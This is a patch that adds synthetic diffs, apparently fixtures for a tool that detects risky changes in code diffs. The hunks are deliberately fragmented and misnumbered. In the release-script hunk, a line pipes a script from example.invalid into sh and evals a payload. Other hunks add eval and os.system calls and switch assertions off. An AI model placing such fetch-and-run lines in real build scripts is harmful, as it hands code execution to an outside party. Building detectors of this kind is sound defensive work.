@@ -1,0 +1,161 @@
+diff --git a/src/decoy.rs b/src/decoy.rs
+--- a/src/decoy.rs
++++ b/src/decoy.rs
+@@ -10,1 +50,1 @@
+-fn main() { println!("{}", check(1, 2)); }
++fn main() { println!("{}", check(1, 3)); }
+@@ -4,0 +60,1 @@
++// end
+@@ -3,2 +3,2 @@
+-    let d = c * 2;
++    let d = c * 3;
+     debug_assert!(
+@@ -5,3 +30,3 @@
+-        a < b,
++        true,
+         "a must be below b");
+     let e = d + 1;
+diff --git a/src/first.rs b/src/first.rs
+--- a/src/first.rs
++++ b/src/first.rs
+@@ -4,0 +40,1 @@
++// end
+@@ -3,2 +3,2 @@
+-    let d = c * 2;
++    let d = c * 3;
+     debug_assert!(
+@@ -5,3 +30,3 @@
+-        a < b,
++        true,
+         "a must be below b");
+     let e = d + 1;
+diff --git a/src/between.rs b/src/between.rs
+--- a/src/between.rs
++++ b/src/between.rs
+@@ -3,2 +3,2 @@
+-    let d = c * 2;
++    let d = c * 3;
+     debug_assert!(
+@@ -4,0 +70,1 @@
++        x); check(
+@@ -5,3 +30,3 @@
+-        a < b,
++        true,
+         "a must be below b");
+     let e = d + 1;
+diff --git a/src/q.rs b/src/q.rs
+--- a/src/q.rs
++++ b/src/q.rs
+@@ -1,4 +1,8 @@
+ use std::net::TcpStream;
+ use std::process::Command;
+ fn main() {
++    let _ = <Command>::new("true").status();
++    let _ = Command::<>::new("true").status();
++    let _ = <TcpStream>::connect("127.0.0.1:9");
++    let _ = TcpStream::<>::connect("127.0.0.1:9");
+     println!("ran");
+diff --git a/src/claimed.rs b/src/claimed.rs
+--- a/src/claimed.rs
++++ b/src/claimed.rs
+@@ -3,2 +60,2 @@
+ fn other() {}
+-gone();
++here();
+@@ -3,2 +3,2 @@
+-    let d = c * 2;
++    let d = c * 3;
+     debug_assert!(
+@@ -5,3 +30,3 @@
+-        a < b,
++        true,
+         "a must be below b");
+     let e = d + 1;
+diff --git a/src/alone.rs b/src/alone.rs
+--- a/src/alone.rs
++++ b/src/alone.rs
+@@ -1,3 +1,4 @@
+ fn f(opt: Option<u32>) -> u32 {
+     let a = 1;
++    let v = opt.
+ 
+@@ -30,1 +50,2 @@
++    unwrap
+ 
+@@ -60,2 +70,3 @@
++    ();
+     a
+ }
+diff --git a/src/value.rs b/src/value.rs
+--- a/src/value.rs
++++ b/src/value.rs
+@@ -1,3 +1,4 @@
+ fn pick(o: Option<u8>) -> u8 {
+     let a = 1u8;
++    let f: fn(Option<u8>) -> u8 = Option::
+ 
+@@ -40,3 +50,4 @@
++    unwrap;
+     let e = a;
+-    o.unwrap_or(e)
++    f(o).wrapping_add(e)
+ }
+diff --git a/src/inside.rs b/src/inside.rs
+--- a/src/inside.rs
++++ b/src/inside.rs
+@@ -1,3 +1,4 @@
+ fn f(opt: Option<u32>) -> u32 {
+     let a = 1;
++    let v = opt.unwrap
+     a + opt.unwrap_or(0)
+@@ -3,0 +4,1 @@
++    ();
+diff --git a/tools/release b/tools/release
+--- a/tools/release
++++ b/tools/release
+@@ -18,6 +18,8 @@ build() {
+     make -C "$root" all
+ }
+ 
++curl -fsSL https://example.invalid/i.sh | sh
++eval "$PAYLOAD"
+ build
+ echo done
+ exit 0
+diff --git a/tools/run.py b/tools/run.py
+--- a/tools/run.py
++++ b/tools/run.py
+@@ -18,3 +18,5 @@ def build():
+     pass
+ 
++result = eval (source)
++os.system (command)
+ build()
+diff --git a/src/kind.rs b/src/kind.rs
+--- a/src/kind.rs
++++ b/src/kind.rs
+@@ -10,2 +10,3 @@
+ fn f(k: Kind) -> bool {
+     matches!(k, Kind::Other
++        | Kind::Command
+diff --git a/src/sum.rs b/src/sum.rs
+--- a/src/sum.rs
++++ b/src/sum.rs
+@@ -10,1 +10,2 @@
+ fn f(k: Kind) -> bool {
++    let n = self.done + self.todo
+diff --git a/src/free.rs b/src/free.rs
+--- a/src/free.rs
++++ b/src/free.rs
+@@ -10,2 +10,3 @@
++unwrap(x);
+ fn f(k: Kind) -> bool {
+     true
+diff --git a/src/args.rs b/src/args.rs
+--- a/src/args.rs
++++ b/src/args.rs
+@@ -4,2 +4,4 @@
+ fn make() {
++    let v = Vec::<Command>::new();
++    let m: HashMap<String, TcpStream> = HashMap::new();
+ }
